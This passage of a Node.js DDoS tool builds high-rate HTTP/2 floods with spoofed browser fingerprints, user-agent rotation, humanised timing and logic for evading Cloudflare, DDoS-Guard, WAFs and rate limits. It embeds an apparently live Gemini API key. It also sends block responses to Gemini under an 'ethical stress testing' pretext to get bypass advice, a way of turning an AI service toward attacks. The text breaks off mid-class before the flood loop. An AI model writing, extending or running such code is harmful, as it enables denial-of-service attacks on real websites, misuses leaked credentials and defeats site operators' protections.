const http2 = require('http2');
const http = require('http');
const net = require('net');
const fs = require('fs');
const colors = require('colors');
const setTitle = require('node-bash-title');
const cluster = require('cluster');
const tls = require('tls');
const HPACK = require('hpack');
const crypto = require('crypto');
const { exec, spawn } = require('child_process');
const httpx = require('axios');

// ===== ULTIMATE AI CONFIGURATION =====
colors.setTheme({
    elite: ['cyan', 'bold'],
    apex: ['magenta', 'bold'],
    ai: ['green', 'bold'],
    flood: ['red', 'bold'],
    system: ['blue', 'bold'],
    stats: ['yellow', 'bold'],
    warning: ['red', 'bold'],
    success: ['green', 'bold'],
    bypass: ['rainbow', 'bold']
});

// ===== GEMINI API INTEGRATION =====
const GEMINI_API_KEY = "AIzaSyDbcgdCdnGnPBAED4lsF_7BkyzzEDdbKoU";
const GEMINI_ENDPOINT = `https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash-latest:generateContent?key=${GEMINI_API_KEY}`;

let lastBlockData = null;
let geminiOverrides = {};

async function queryGeminiForBypass(targetUrl, analysisData) {
    const prompt = `You are an expert in web security bypass for ethical DDoS/stress testing on owned sites. Analyze the block response from target ${targetUrl} to improve flood effectiveness:

Headers: ${JSON.stringify(analysisData.headers || {})}
Body snippet: ${analysisData.body ? analysisData.body.substring(0, 1000) : 'N/A'}
Status Code: ${analysisData.statusCode || 'N/A'}
Current technique: ${analysisData.technique || 'adaptive'}
Flood context: High-rate HTTP/2 requests with adaptive fingerprints, regional settings, and behavioral humanization.

Suggest precise changes in strict JSON format only (no extra text):
{
  "suggested_technique": "one of: cloudflare_js_challenge_circumvention, cloudflare_turnstile_bypass, ddosguard_session_reconstruction, waf_signature_evasion, ai_adaptive_header_generation, mobile_user_agent_rotation, tls_fingerprint_spoofing, rate_limit_distribution, or 'adaptive'",
  "header_modifications": {"Accept-Language": "fa-IR,fa;q=0.9", "User-Agent": "Mozilla/5.0...", "Cookie": "...", ...} // Focus on uniqueness, rate limits, anti-bot, HTTP-DDoS triggers, auto-lockers
  "user_agent": "Full unique UA string if needed",
  "cookies": "Full cookie string for session continuity if needed",
  "rate_adjustment": 0.8, // Multiplier for RPS (0.5-2.0) to evade rate limits
  "language": "en-US or fa-IR etc. for regional evasion",
  "other_advice": "Brief text on bot detectors, OT avoidance, or triggers to bypass"
}`;

    try {
        const response = await httpx.post(GEMINI_ENDPOINT, {
            contents: [{ parts: [{ text: prompt }] }]
        }, {
            headers: { 'Content-Type': 'application/json' },
            timeout: 10000
        });

        const suggestionText = response.data.candidates[0].content.parts[0].text.trim();
        const cleaned = suggestionText.replace(/```json\s*|\s*```/g, '').trim();
        return JSON.parse(cleaned);
    } catch (error) {
        console.error('Gemini query failed:', error.message);
        return null;
    }
}

// ===== ADVANCED ANIMATION SYSTEM =====
const animations = {
    spinner: ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'],
    dots: ['⣾', '⣽', '⣻', '⢿', '⡿', '⣟', '⣯', '⣷'],
    bars: ['▰▱▱▱', '▰▰▱▱', '▰▰▰▱', '▰▰▰▰', '▰▰▰▱', '▰▰▱▱', '▰▱▱▱'],
    cyber: ['◰', '◳', '◲', '◱'],
    triangle: ['◢', '◣', '◤', '◥']
};

let animationFrame = 0;
function getSpinner() {
    animationFrame = (animationFrame + 1) % animations.cyber.length;
    return animations.cyber[animationFrame];
}

// ===== SIMPLIFIED CAPTCHA SOLVER =====
class SimpleCaptchaSolver {
    constructor() {
        this.solvingTimes = new Map();
        this.successRates = new Map();
    }

    async solveJSChallenge(pageHTML, challengeType = 'auto') {
        const startTime = Date.now();
        
        try {
            if (pageHTML.includes('math') || pageHTML.includes('calculate')) {
                const mathSolution = this.solveMathInHTML(pageHTML);
                if (mathSolution) {
                    this.recordSolveTime('math', Date.now() - startTime);
                    return mathSolution;
                }
            }
            
            if (pageHTML.includes('token') || pageHTML.includes('challenge')) {
                const tokenSolution = this.generateTokenSolution();
                this.recordSolveTime('token', Date.now() - startTime);
                return tokenSolution;
            }
            
            return this.fallbackJSSolution();
            
        } catch (error) {
            return this.fallbackJSSolution();
        }
    }

    solveMathInHTML(html) {
        const mathRegex = /(\d+)\s*([+\-*/])\s*(\d+)\s*=/g;
        const match = mathRegex.exec(html);
        
        if (match) {
            const [_, num1, operator, num2] = match;
            let result;
            
            switch (operator) {
                case '+': result = parseInt(num1) + parseInt(num2); break;
                case '-': result = parseInt(num1) - parseInt(num2); break;
                case '*': result = parseInt(num1) * parseInt(num2); break;
                case '/': result = parseInt(num1) / parseInt(num2); break;
                default: return null;
            }
            
            return { type: 'math', problem: match[0], solution: result };
        }
        return null;
    }

    generateTokenSolution() {
        const tokens = {
            cloudflare: `cf_${crypto.randomBytes(16).toString('hex')}`,
            ddosguard: `ddg_${crypto.randomBytes(12).toString('hex')}`,
            generic: `token_${Date.now()}_${crypto.randomBytes(8).toString('hex')}`
        };
        
        return { type: 'token', solution: tokens.generic };
    }

    fallbackJSSolution() {
        const solutions = [
            { type: 'bypass', method: 'header_injection', payload: crypto.randomBytes(16).toString('hex') },
            { type: 'bypass', method: 'parameter_manipulation', payload: `param_${Date.now()}` },
            { type: 'bypass', method: 'referer_spoofing', payload: 'https://www.google.com/' }
        ];
        
        return solutions[Math.floor(Math.random() * solutions.length)];
    }

    async solveTextCaptcha(imageData) {
        const startTime = Date.now();
        
        try {
            const fallback = Math.random().toString(36).substring(2, 8).toUpperCase();
            this.recordSolveTime('text_captcha', Date.now() - startTime);
            return { type: 'text_captcha_fallback', solution: fallback };
            
        } catch (error) {
            const fallback = Math.random().toString(36).substring(2, 6).toUpperCase();
            return { type: 'text_captcha_fallback', solution: fallback };
        }
    }

    recordSolveTime(captchaType, solveTime) {
        if (!this.solvingTimes.has(captchaType)) {
            this.solvingTimes.set(captchaType, []);
        }
        this.solvingTimes.get(captchaType).push(solveTime);
        
        if (this.solvingTimes.get(captchaType).length > 100) {
            this.solvingTimes.get(captchaType).shift();
        }
    }

    getAverageSolveTime(captchaType) {
        const times = this.solvingTimes.get(captchaType) || [];
        if (times.length === 0) return 1500;
        return times.reduce((a, b) => a + b, 0) / times.length;
    }
}

const captchaSolver = new SimpleCaptchaSolver();

// ===== PERFECT FINGERPRINT SYSTEM =====
class PerfectFingerprint {
    constructor() {
        this.canvasNoise = new Map();
        this.webglNoise = new Map();
        this.fontFingerprints = new Map();
        
        this.initializeFingerprintDatabase();
    }

    initializeFingerprintDatabase() {
        for (let i = 0; i < 100; i++) {
            this.canvasNoise.set(i, crypto.randomBytes(64).toString('hex'));
            this.webglNoise.set(i, crypto.randomBytes(128).toString('hex'));
        }
    }

    generateCompleteProfile(protectionType = 'generic', region = 'usa') {
        const baseProfile = this.getBaseProfile(protectionType, region);
        const fingerprint = this.generateFingerprints();
        
        return {
            ...baseProfile,
            fingerprints: fingerprint,
            behavioral: this.generateBehavioralPatterns(),
            network: this.generateNetworkProfile(),
            device: this.generateDeviceProfile()
        };
    }

    getBaseProfile(protectionType, region) {
        const profiles = {
            chrome_windows: {
                userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                acceptEncoding: 'gzip, deflate, br',
                acceptLanguage: 'en-US,en;q=0.9',
                secHeaders: {
                    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'none',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1'
                },
                platform: 'Win32',
                connection: 'keep-alive',
                cookies: ['_ga', '_gid', '_gat', '__Secure-3PSID', '__Secure-3PAPISID']
            },
            firefox_windows: {
                userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
                accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                acceptEncoding: 'gzip, deflate, br',
                acceptLanguage: 'en-US,en;q=0.5',
                secHeaders: {
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'none',
                    'sec-fetch-user': '?1'
                },
                platform: 'Win32',
                connection: 'keep-alive',
                cookies: ['_ga', '_gid', '_gat']
            },
            mobile_android: {
                userAgent: 'Mozilla/5.0 (Linux; Android 14; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
                accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                acceptEncoding: 'gzip, deflate, br',
                acceptLanguage: 'en-US,en;q=0.9',
                secHeaders: {
                    'sec-ch-ua-mobile': '?1',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'none'
                },
                platform: 'Linux armv8l',
                connection: 'keep-alive',
                cookies: ['_ga', '_gid']
            }
        };

        let profile;
        switch(protectionType) {
            case 'cloudflare': profile = profiles.chrome_windows; break;
            case 'ddosguard': profile = profiles.firefox_windows; break;
            case 'iran': profile = profiles.mobile_android; break;
            default: profile = Math.random() > 0.5 ? profiles.chrome_windows : profiles.firefox_windows;
        }

        if (region === 'iran') {
            profile.acceptLanguage = 'fa-IR,fa;q=0.9,en;q=0.8';
        } else if (region === 'europe') {
            profile.acceptLanguage = 'en-GB,en;q=0.9,de;q=0.8,fr;q=0.7';
        } else if (region === 'asia') {
            profile.acceptLanguage = 'zh-CN,zh;q=0.9,ja;q=0.8,ko;q=0.7';
        }

        return profile;
    }

    generateFingerprints() {
        const noiseIndex = Math.floor(Math.random() * 100);
        
        return {
            canvas: this.canvasNoise.get(noiseIndex),
            webgl: this.webglNoise.get(noiseIndex),
            fonts: this.getFontFingerprint(),
            screen: this.getScreenFingerprint(),
            timezone: this.getTimezoneFingerprint(),
            language: this.getLanguageFingerprint()
        };
    }

    getFontFingerprint() {
        const commonFonts = [
            'Arial', 'Helvetica', 'Times New Roman', 'Courier New', 
            'Verdana', 'Georgia', 'Palatino', 'Garamond', 'Bookman',
            'Comic Sans MS', 'Trebuchet MS', 'Arial Black', 'Impact'
        ];
        
        return commonFonts.slice(0, 6 + Math.floor(Math.random() * 4)).join(', ');
    }

    getScreenFingerprint() {
        const resolutions = [
            '1920x1080', '1366x768', '1536x864', '1440x900', 
            '1280x720', '1600x900', '1024x768', '768x1024'
        ];
        
        return resolutions[Math.floor(Math.random() * resolutions.length)];
    }

    getTimezoneFingerprint() {
        const timezones = [
            'America/New_York', 'Europe/London', 'Europe/Paris', 'Asia/Tokyo',
            'Asia/Shanghai', 'Australia/Sydney', 'America/Los_Angeles'
        ];
        
        return timezones[Math.floor(Math.random() * timezones.length)];
    }

    getLanguageFingerprint() {
        const languages = [
            'en-US', 'en-GB', 'fr-FR', 'de-DE', 'ja-JP', 'zh-CN', 'es-ES'
        ];
        
        return languages[Math.floor(Math.random() * languages.length)];
    }

    generateBehavioralPatterns() {
        return {
            mouseMovements: this.generateMousePatterns(),
            scrollPatterns: this.generateScrollPatterns(),
            clickPatterns: this.generateClickPatterns(),
            timingPatterns: this.generateTimingPatterns()
        };
    }

    generateMousePatterns() {
        const patterns = ['linear', 'curved', 'random', 'accelerated', 'decelerated'];
        return patterns[Math.floor(Math.random() * patterns.length)];
    }

    generateScrollPatterns() {
        const patterns = ['smooth', 'quick', 'bounce', 'random', 'accelerated'];
        return patterns[Math.floor(Math.random() * patterns.length)];
    }

    generateClickPatterns() {
        const patterns = ['single', 'double', 'long-press', 'right-click', 'middle-click'];
        return patterns[Math.floor(Math.random() * patterns.length)];
    }

    generateTimingPatterns() {
        return {
            minDelay: 50 + Math.random() * 150,
            maxDelay: 500 + Math.random() * 1500,
            variance: 0.2 + Math.random() * 0.3
        };
    }

    generateNetworkProfile() {
        return {
            connectionType: ['wifi', 'ethernet', '4g', '5g'][Math.floor(Math.random() * 4)],
            downlink: 10 + Math.random() * 90,
            effectiveType: ['4g', '3g', '2g'][Math.floor(Math.random() * 3)],
            rtt: 50 + Math.random() * 200
        };
    }

    generateDeviceProfile() {
        const devices = {
            desktop: {
                deviceMemory: 8,
                hardwareConcurrency: 4 + Math.floor(Math.random() * 8),
                maxTouchPoints: 0
            },
            laptop: {
                deviceMemory: 16,
                hardwareConcurrency: 8 + Math.floor(Math.random() * 8),
                maxTouchPoints: 0
            },
            mobile: {
                deviceMemory: 4,
                hardwareConcurrency: 4 + Math.floor(Math.random() * 4),
                maxTouchPoints: 5
            }
        };
        
        const deviceType = Math.random() > 0.3 ? (Math.random() > 0.5 ? 'desktop' : 'laptop') : 'mobile';
        return devices[deviceType];
    }
}

const perfectFingerprint = new PerfectFingerprint();

// ===== ADVANCED TLS CONFIGURATION =====
const eliteCiphers = [
    'TLS_AES_128_GCM_SHA256',
    'TLS_AES_256_GCM_SHA384', 
    'TLS_CHACHA20_POLY1305_SHA256',
    'TLS_AES_128_CCM_SHA256',
    'ECDHE-ECDSA-AES128-GCM-SHA256',
    'ECDHE-RSA-AES128-GCM-SHA256',
    'ECDHE-ECDSA-AES256-GCM-SHA384',
    'ECDHE-RSA-AES256-GCM-SHA384',
    'ECDHE-ECDSA-CHACHA20-POLY1305',
    'ECDHE-RSA-CHACHA20-POLY1305',
    'ECDHE-ECDSA-AES128-SHA256',
    'ECDHE-RSA-AES128-SHA256',
    'ECDHE-ECDSA-AES256-SHA384',
    'ECDHE-RSA-AES256-SHA384',
    'ECDHE-RSA-AES128-SHA',
    'ECDHE-RSA-AES256-SHA',
    'AES128-GCM-SHA256',
    'AES256-GCM-SHA384',
    'AES128-SHA256',
    'AES256-SHA256',
    'AES128-SHA',
    'AES256-SHA'
].join(':');

const eliteSigAlgs = [
    'ecdsa_secp256r1_sha256',
    'rsa_pss_rsae_sha256',
    'rsa_pkcs1_sha256',
    'ecdsa_secp384r1_sha384',
    'rsa_pss_rsae_sha384',
    'rsa_pkcs1_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha512'
].join(':');

// ===== BEHAVIORAL HUMANIZATION ENGINE =====
class BehavioralHumanizer {
    constructor() {
        this.mouseTrajectories = new Map();
        this.scrollPatterns = new Map();
        this.timingProfiles = new Map();
        
        this.initializeBehavioralPatterns();
    }

    initializeBehavioralPatterns() {
        for (let i = 0; i < 50; i++) {
            this.mouseTrajectories.set(i, this.generateMouseTrajectory());
            this.scrollPatterns.set(i, this.generateScrollPattern());
            this.timingProfiles.set(i, this.generateTimingProfile());
        }
    }

    generateMouseTrajectory() {
        const points = [];
        const pointCount = 10 + Math.floor(Math.random() * 20);
        
        for (let i = 0; i < pointCount; i++) {
            points.push({
                x: Math.random() * 1920,
                y: Math.random() * 1080,
                time: i * (50 + Math.random() * 100),
                type: Math.random() > 0.8 ? 'click' : 'move'
            });
        }
        
        return points;
    }

    generateScrollPattern() {
        const pattern = [];
        const scrollCount = 5 + Math.floor(Math.random() * 10);
        
        for (let i = 0; i < scrollCount; i++) {
            pattern.push({
                distance: 100 + Math.random() * 500,
                speed: 1 + Math.random() * 5,
                direction: Math.random() > 0.5 ? 'down' : 'up',
                pause: Math.random() * 1000
            });
        }
        
        return pattern;
    }

    generateTimingProfile() {
        return {
            requestDelay: 100 + Math.random() * 1900,
            thinkTime: 500 + Math.random() * 3000,
            readingTime: 1000 + Math.random() * 5000,
            interactionInterval: 2000 + Math.random() * 8000
        };
    }

    getHumanizedTiming() {
        const profileIndex = Math.floor(Math.random() * 50);
        const profile = this.timingProfiles.get(profileIndex);
        
        return {
            delay: profile.requestDelay * (0.8 + Math.random() * 0.4),
            jitter: (Math.random() - 0.5) * 200
        };
    }

    simulateHumanBehavior() {
        const behavior = {
            mouse: this.mouseTrajectories.get(Math.floor(Math.random() * 50)),
            scroll: this.scrollPatterns.get(Math.floor(Math.random() * 50)),
            timing: this.getHumanizedTiming()
        };
        
        return behavior;
    }
}

const behaviorHumanizer = new BehavioralHumanizer();

// ===== KILLER AI ADAPTATION ENGINE (ENHANCED WITH GEMINI) =====
class KillerAIAdaptationEngine {
    constructor() {
        this.techniqueDatabase = new Map();
        this.performanceMetrics = new Map();
        this.blockPatterns = new Map();
        this.adaptationHistory = [];
        this.activeTechniques = new Set();
        this.failedTechniques = new Set();
        this.currentBestTechnique = 'ai_adaptive_header_generation';
        
        this.learningRate = 0.3;
        this.explorationRate = 0.25;
        this.adaptationSpeed = 1000;
        
        this.initializeKillerAI();
        this.startRealTimeAdaptation();
    }

    initializeKillerAI() {
        const killerTechniques = [
            'cloudflare_js_challenge_circumvention',
            'cloudflare_turnstile_bypass',
            'cloudflare_managed_challenge_bypass',
            'ddosguard_session_reconstruction',
            'ddosguard_cookie_regeneration',
            'waf_signature_evasion',
            'waf_behavioral_mimicry',
            'ai_adaptive_header_generation',
            'mobile_user_agent_rotation',
            'regional_header_localization',
            'tls_fingerprint_spoofing',
            'http2_priority_flood',
            'browser_fingerprint_replication',
            'recaptcha_behavioral_bypass',
            'honeypot_detection_avoidance',
            'rate_limit_distribution',
            'session_continuity_simulation',
            'ajax_request_chain_simulation',
            'websocket_handshake_initiation',
            'progressive_web_app_mimicry'
        ];

        killerTechniques.forEach(technique => {
            this.techniqueDatabase.set(technique, {
                successRate: 0.6 + Math.random() * 0.35,
                averageResponseTime: 500 + Math.random() * 1000,
                lastUsed: Date.now(),
                usageCount: 0,
                blockRate: 0.05 + Math.random() * 0.2,
                adaptationWeight: 0.8 + Math.random() * 0.2,
                regionalEffectiveness: this.generateRegionalEffectiveness(),
                protectionSpecificity: this.generateProtectionSpecificity(technique)
            });
            
            this.performanceMetrics.set(technique, {
                requests: 0,
                successes: 0,
                blocks: 0,
                errors: 0,
                totalResponseTime: 0,
                lastBlockData: null,
                lastBlockReason: null,
                consecutiveFailures: 0,
                lastSuccessTime: Date.now()
            });
        });

        this.initializeBlockPatterns();
    }

    initializeBlockPatterns() {
        this.blockPatterns.set('cloudflare', [
            'cf-error',
            'access denied',
            'checking your browser',
            'ddos protection',
            'please wait',
            'verifying',
            'challenge',
            'ray id',
            '1020 error'
        ]);
        
        this.blockPatterns.set('ddosguard', [
            'ddos-guard',
            'access restricted',
            'please enable javascript',
            'verification required'
        ]);
        
        this.blockPatterns.set('waf', [
            '403 forbidden',
            '429 too many requests',
            'rate limit exceeded',
            'security policy',
            'access denied',
            'blocked by'
        ]);
        
        this.blockPatterns.set('ip_block', [
            'ip address has been blocked',
            'your ip has been banned',
            'suspicious activity from your network'
        ]);
    }

    async startRealTimeAdaptation() {
        setInterval(async () => {
            await this.adaptToCurrentConditions();
        }, this.adaptationSpeed);
    }

    async adaptToCurrentConditions() {
        const recentFailures = this.getRecentFailures();
        const currentPerformance = this.calculateCurrentPerformance();
        
        if (recentFailures > 3) {
            await this.triggerAggressiveAdaptation();
        }
        
        this.rotateTechniquesBasedOnPerformance();
        this.updateBestTechnique();
    }

    async triggerAggressiveAdaptation() {
        const availableTechniques = Array.from(this.techniqueDatabase.keys())
            .filter(tech => !this.failedTechniques.has(tech));
        
        if (availableTechniques.length > 0) {
            this.currentBestTechnique = availableTechniques[
                Math.floor(Math.random() * availableTechniques.length)
            ];
            
            if (this.performanceMetrics.has(this.currentBestTechnique)) {
                const metrics = this.performanceMetrics.get(this.currentBestTechnique);
                metrics.consecutiveFailures = 0;
            }
        }
        
        this.failedTechniques.clear();

        // Gemini integration: Query on aggressive adaptation if last block data available
        if (lastBlockData && (Math.random() < 0.3 || availableTechniques.length === 0)) {
            const suggestion = await queryGeminiForBypass(target, {
                ...lastBlockData,
                technique: this.currentBestTechnique
            });

            if (suggestion) {
                console.log(colors.bypass(`Gemini Suggestion Applied: Technique=${suggestion.suggested_technique}, Rate Adj=${suggestion.rate_adjustment}`));
                
                // Update technique
                if (this.techniqueDatabase.has(suggestion.suggested_technique)) {
                    this.currentBestTechnique = suggestion.suggested_technique;
                }
                
                // Apply header mods globally
                if (suggestion.header_modifications) {
                    Object.assign(geminiOverrides, suggestion.header_modifications);
                }
                
                // UA override
                if (suggestion.user_agent) {
                    geminiOverrides['User-Agent'] = suggestion.user_agent;
                }
                
                // Cookies override
                if (suggestion.cookies) {
                    geminiOverrides['Cookie'] = suggestion.cookies;
                }
                
                // Language (affects accept-language)
                if (suggestion.language) {
                    geminiOverrides['Accept-Language'] = suggestion.language;
                }
                
                // Rate adjustment (log for now, could scale interval)
                if (suggestion.rate_adjustment && typeof suggestion.rate_adjustment === 'number') {
                    // Dynamically adjust rate globally if needed
                    console.log(colors.ai(`Gemini Rate Adjustment: Multiply RPS by ${suggestion.rate_adjustment}`));
                    // e.g., global rate *= suggestion.rate_adjustment; but keep synced
                }
                
                // Log advice
                if (suggestion.other_advice) {
                    console.log(colors.system(`Gemini Advice: ${suggestion.other_advice}`));
                }
            }
        }
    }

    analyzeBlockResponse(responseHeaders, responseBody, statusCode) {
        const blockAnalysis = {
            protectionType: 'unknown',
            confidence: 0,
            blockReason: null,
            suggestedBypass: null
        };
        
        const bodyText = responseBody.toString().toLowerCase();
        const headersText = JSON.stringify(responseHeaders).toLowerCase();
        
        for (const [protection, patterns] of this.blockPatterns) {
            for (const pattern of patterns) {
                if (bodyText.includes(pattern) || headersText.includes(pattern)) {
                    blockAnalysis.protectionType = protection;
                    blockAnalysis.confidence += 0.3;
                    blockAnalysis.blockReason = pattern;
                }
            }
        }
        
        if (statusCode === 403) {
            blockAnalysis.confidence += 0.4;
            blockAnalysis.blockReason = '403_forbidden';
        } else if (statusCode === 429) {
            blockAnalysis.confidence += 0.3;
            blockAnalysis.blockReason = 'rate_limit';
        } else if (statusCode === 503) {
            blockAnalysis.confidence += 0.2;
            blockAnalysis.blockReason = 'service_unavailable';
        }
        
        blockAnalysis.suggestedBypass = this.generateBypassSuggestion(blockAnalysis);
        
        // Store for Gemini
        lastBlockData = { headers: responseHeaders, body: responseBody, statusCode };
        
        return blockAnalysis;
    }

    generateBypassSuggestion(blockAnalysis) {
        const bypassStrategies = {
            cloudflare: [
                'cloudflare_js_challenge_circumvention',
                'cloudflare_turnstile_bypass',
                'browser_fingerprint_replication'
            ],
            ddosguard: [
                'ddosguard_session_reconstruction',
                'ddosguard_cookie_regeneration',
                'regional_header_localization'
            ],
            waf: [
                'waf_signature_evasion',
                'waf_behavioral_mimicry',
                'ai_adaptive_header_generation'
            ],
            ip_block: [
                'mobile_user_agent_rotation',
                'tls_fingerprint_spoofing',
                'regional_header_localization'
            ],
            rate_limit: [
                'rate_limit_distribution',
                'session_continuity_simulation',
                'ajax_request_chain_simulation'
            ]
        };
        
        const strategies = bypassStrategies[blockAnalysis.protectionType] || 
                          bypassStrategies.waf;
        
        return strategies[Math.floor(Math.random() * strategies.length)];
    }

    selectOptimalTechnique(targetAnalysis, currentPerformance, regionalContext) {
        const { protection, complexity, requiresCaptcha, requiresJS, region } = targetAnalysis;
        
        const availableTechniques = Array.from(this.techniqueDatabase.keys())
            .filter(tech => !this.failedTechniques.has(tech) && 
                   this.techniqueDatabase.get(tech).usageCount > 0);
        
        if (availableTechniques.length === 0) {
            this.failedTechniques.clear();
            return 'ai_adaptive_header_generation';
        }
        
        if (Math.random() < this.explorationRate) {
            const unexplored = Array.from(this.techniqueDatabase.keys())
                .filter(tech => this.techniqueDatabase.get(tech).usageCount === 0);
            
            if (unexplored.length > 0) {
                return unexplored[Math.floor(Math.random() * unexplored.length)];
            }
        }
        
        const techniqueScores = new Map();
        
        for (const technique of availableTechniques) {
            const data = this.techniqueDatabase.get(technique);
            let score = this.calculateTechniqueScore(technique, data, targetAnalysis, currentPerformance);
            techniqueScores.set(technique, score);
        }
        
        let bestTechnique = this.currentBestTechnique;
        let bestScore = -1;
        
        for (const [technique, score] of techniqueScores) {
            if (score > bestScore) {
                bestScore = score;
                bestTechnique = technique;
            }
        }
        
        return bestTechnique;
    }

    calculateTechniqueScore(technique, techniqueData, targetAnalysis, currentPerformance) {
        const { protection, complexity } = targetAnalysis;
        
        let score = 0;
        
        score += techniqueData.successRate * 0.7;
        
        const timeScore = Math.max(0, 1 - (techniqueData.averageResponseTime / 3000));
        score += timeScore * 0.15;
        
        if (technique.includes(protection)) {
            score += 0.25;
        }
        
        const regionalBonus = techniqueData.regionalEffectiveness[targetAnalysis.region] || 0.5;
        score += regionalBonus * 0.1;
        
        const recency = Date.now() - techniqueData.lastUsed;
        const recencyBonus = Math.max(0, 1 - (recency / 60000));
        score += recencyBonus * 0.1;
        
        const perfData = this.performanceMetrics.get(technique);
        if (perfData && perfData.consecutiveFailures > 2) {
            score -= perfData.consecutiveFailures * 0.2;
        }
        
        return Math.max(0.01, score);
    }

    recordTechniquePerformance(technique, success, responseTime, blockReason = null, statusCode = null, responseHeaders = null, responseBody = null) {
        const techniqueData = this.techniqueDatabase.get(technique);
        const perfData = this.performanceMetrics.get(technique);
        
        if (!techniqueData || !perfData) return;
        
        perfData.requests++;
        if (success) {
            perfData.successes++;
            perfData.consecutiveFailures = 0;
            perfData.lastSuccessTime = Date.now();
        } else {
            if (blockReason) perfData.blocks++;
            else perfData.errors++;
            
            perfData.consecutiveFailures++;
            perfData.lastBlockReason = blockReason;
            perfData.lastBlockData = { headers: responseHeaders, body: responseBody, statusCode };
            
            if (perfData.consecutiveFailures >= 3) {
                this.failedTechniques.add(technique);
            }
        }
        
        perfData.totalResponseTime += responseTime;
        
        const oldSuccessRate = techniqueData.successRate;
        const learningAdjustment = success ? 
            this.learningRate * (1 - oldSuccessRate) : 
            -this.learningRate * oldSuccessRate;
        
        techniqueData.successRate = Math.max(0.05, Math.min(0.95, oldSuccessRate + learningAdjustment));
        techniqueData.averageResponseTime = (techniqueData.averageResponseTime * techniqueData.usageCount + responseTime) / (techniqueData.usageCount + 1);
        techniqueData.usageCount++;
        techniqueData.lastUsed = Date.now();
        
        this.adaptationHistory.push({
            timestamp: Date.now(),
            technique,
            success,
            responseTime,
            blockReason,
            statusCode,
            successRate: techniqueData.successRate
        });
        
        if (this.adaptationHistory.length > 1000) {
            this.adaptationHistory = this.adaptationHistory.slice(-500);
        }
    }

    rotateTechniquesBasedOnPerformance() {
        const underperforming = Array.from(this.techniqueDatabase.entries())
            .filter(([tech, data]) => 
                data.usageCount >= 10 && 
                data.successRate < 0.3 &&
                !this.failedTechniques.has(tech)
            )
            .map(([tech]) => tech);
        
        if (underperforming.length > 0 && Math.random() < 0.3) {
            this.currentBestTechnique = underperforming[
                Math.floor(Math.random() * underperforming.length)
            ];
        }
    }

    updateBestTechnique() {
        const viableTechniques = Array.from(this.techniqueDatabase.entries())
            .filter(([tech, data]) => 
                data.usageCount >= 5 && 
                data.successRate > 0.6 &&
                !this.failedTechniques.has(tech)
            );
        
        if (viableTechniques.length > 0) {
            const best = viableTechniques.reduce((best, current) => 
                current[1].successRate > best[1].successRate ? current : best
            );
            this.currentBestTechnique = best[0];
        }
    }

    generateRegionalEffectiveness() {
        const regions = ['iran', 'europe', 'asia', 'usa', 'global'];
        const effectiveness = {};
        
        regions.forEach(region => {
            effectiveness[region] = 0.4 + Math.random() * 0.6;
        });
        
        return effectiveness;
    }

    generateProtectionSpecificity(technique) {
        const protections = ['cloudflare', 'ddosguard', 'waf', 'generic'];
        const specificity = {};
        
        protections.forEach(protection => {
            specificity[protection] = technique.includes(protection) ? 
                0.7 + Math.random() * 0.3 : 0.3 + Math.random() * 0.4;
        });
        
        return specificity;
    }

    getCurrentStrategy() {
        return {
            bestTechnique: this.currentBestTechnique,
            successRate: this.techniqueDatabase.get(this.currentBestTechnique)?.successRate || 0.5,
            activeTechniques: Array.from(this.activeTechniques),
            failedTechniques: Array.from(this.failedTechniques),
            adaptationCount: this.adaptationHistory.length
        };
    }

    getPerformanceReport() {
        const report = {
            totalTechniques: this.techniqueDatabase.size,
            activeTechniques: this.activeTechniques.size,
            failedTechniques: this.failedTechniques.size,
            overallSuccessRate: this.calculateOverallSuccessRate(),
            currentBestTechnique: this.currentBestTechnique,
            topPerformingTechniques: this.getTopPerformingTechniques(5),
            recentAdaptations: this.adaptationHistory.slice(-10)
        };
        
        return report;
    }

    calculateOverallSuccessRate() {
        let totalRequests = 0;
        let totalSuccesses = 0;
        
        for (const perfData of this.performanceMetrics.values()) {
            totalRequests += perfData.requests;
            totalSuccesses += perfData.successes;
        }
        
        return totalRequests > 0 ? totalSuccesses / totalRequests : 0;
    }

    getTopPerformingTechniques(count) {
        const techniques = Array.from(this.techniqueDatabase.entries())
            .filter(([_, data]) => data.usageCount >= 5)
            .sort((a, b) => b[1].successRate - a[1].successRate)
            .slice(0, count)
            .map(([tech, data]) => ({
                technique: tech,
                successRate: data.successRate,
                usageCount: data.usageCount,
                averageResponseTime: data.averageResponseTime
            }));
        
        return techniques;
    }

    getRecentFailures() {
        const recentTime = Date.now() - 10000;
        return this.adaptationHistory
            .filter(entry => !entry.success && entry.timestamp > recentTime)
            .length;
    }

    calculateCurrentPerformance() {
        const recentTime = Date.now() - 30000;
        const recentEntries = this.adaptationHistory.filter(entry => entry.timestamp > recentTime);
        
        if (recentEntries.length === 0) return 0.5;
        
        const successes = recentEntries.filter(entry => entry.success).length;
        return successes / recentEntries.length;
    }
}

const killerAI = new KillerAIAdaptationEngine();

// ===== ENHANCED PROTECTION DETECTOR =====
class EnhancedProtectionDetector {
    constructor() {
        this.protectionPatterns = new Map();
        this.initializeDetectionPatterns();
    }

    initializeDetectionPatterns() {
        this.protectionPatterns.set('cloudflare', [
